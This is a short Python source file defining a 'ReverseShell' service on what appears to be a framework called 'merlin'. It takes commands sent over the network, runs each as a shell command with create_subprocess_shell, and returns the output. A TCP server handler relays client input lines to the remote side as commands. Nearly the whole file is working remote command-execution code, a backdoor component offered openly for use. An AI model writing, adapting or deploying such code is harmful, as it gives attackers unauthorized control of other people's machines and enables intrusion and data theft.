import asyncio
from asyncio.subprocess import PIPE, STDOUT

from merlin.core import Service, OpCode
from merlin.ext.ui import TcpServer


class ReverseShell(Service, TcpServer):
    @Service.listener(OpCode.Data)
    async def on_data(self, packet):
        process = await asyncio.create_subprocess_shell(packet.data, stdout=PIPE, stderr=STDOUT)

        try:
            stdout, _ = await process.communicate()
        except Exception as err:
            stdout = str(err).encode('utf-8')

        await packet.ack(stdout.decode('utf-8'))

    @Service.listener(OpCode.Ack)
    async def on_ack(self, packet):
        print('Recieved ack: ', repr(packet))

    # TCP Server

    @TcpServer.client_connected
    async def tcp_server_callback(self, reader, writer):
        async def callback(packet):
            writer.write('{0}:{1}'.format(str(packet.author), str(packet.data)).encode('utf-8'))
            await writer.drain()

        while True:
            data = (await reader.readline()).decode().strip()

            if data == 'exit':
                writer.close()
                await writer.wait_closed()
                break
            else:
                await self._client.send_packet(op=OpCode.Data, data=data, ack_cb=callback)
